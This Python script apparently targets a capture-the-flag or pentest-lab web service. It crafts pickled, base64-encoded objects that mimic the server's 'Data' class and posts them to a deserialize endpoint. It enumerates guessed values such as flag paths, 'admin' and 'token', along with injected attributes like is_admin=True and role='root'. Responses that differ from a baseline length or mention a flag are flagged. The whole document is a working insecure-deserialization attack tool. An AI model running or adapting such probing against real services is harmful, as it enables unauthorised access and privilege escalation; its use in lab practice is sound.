import pickle
import base64
import sys
import types
import requests

TARGET = "http://cc1.pentestgarage.com:3790/"

# create fake module so pickle matches server structure
app = types.ModuleType("app")
sys.modules["app"] = app


class Data:
    __module__ = "app"

    def __init__(self, text):
        self.text = text


app.Data = Data


# payload generator
def generate_payload(value, extra=None):
    payload = Data(value)

    if extra:
        for k, v in extra.items():
            setattr(payload, k, v)

    encoded = base64.b64encode(pickle.dumps(payload))
    return encoded.decode()


# text values to test
tests = [
    "flag",
    "FLAG",
    "Flag",
    "admin",
    "administrator",
    "root",
    "superuser",
    "owner",
    "staff",
    "moderator",
    "secret",
    "secrets",
    "key",
    "token",
    "apikey",
    "password",
    "passwd",
    "auth",
    "getflag",
    "showflag",
    "printflag",
    "readflag",
    "giveflag",
    "debug",
    "dev",
    "test",
    "internal",
    "system",
    "config",
    "settings",
    "true",
    "True",
    "false",
    "False",
    "yes",
    "on",
    "enable",
    "enabled",
    "1",
    "0",
    "flag.txt",
    "/flag",
    "/flag.txt",
    "/app/flag",
    "/home/flag",
    "/tmp/flag"
]


# attribute guesses
attributes = [
    {"admin": True},
    {"is_admin": True},
    {"debug": True},
    {"role": "admin"},
    {"role": "root"},
    {"authenticated": True},
    {"is_authenticated": True},
]


baseline = None

print("\n===== TEXT ENUMERATION =====\n")

for t in tests:

    payload = generate_payload(t)

    response = requests.post(
        TARGET,
        data={"data": payload, "action": "deserialize"}
    )

    length = len(response.text)
    status = response.status_code

    if baseline is None:
        baseline = length

    marker = ""
    if length != baseline:
        marker = "<<< DIFFERENT RESPONSE"

    print(f"[TEXT] {t:20} | Status: {status} | Length: {length} {marker}")

    if "flag" in response.text.lower():
        print("🔥 Possible FLAG found!")
        print(response.text)


print("\n===== ATTRIBUTE ENUMERATION =====\n")

for attr in attributes:

    payload = generate_payload("test", attr)

    response = requests.post(
        TARGET,
        data={"data": payload, "action": "deserialize"}
    )

    length = len(response.text)
    status = response.status_code

    marker = ""
    if length != baseline:
        marker = "<<< DIFFERENT RESPONSE"

    print(f"[ATTR] {str(attr):30} | Status: {status} | Length: {length} {marker}")

    if "flag" in response.text.lower():
        print("🔥 Possible FLAG found!")
        print(response.text)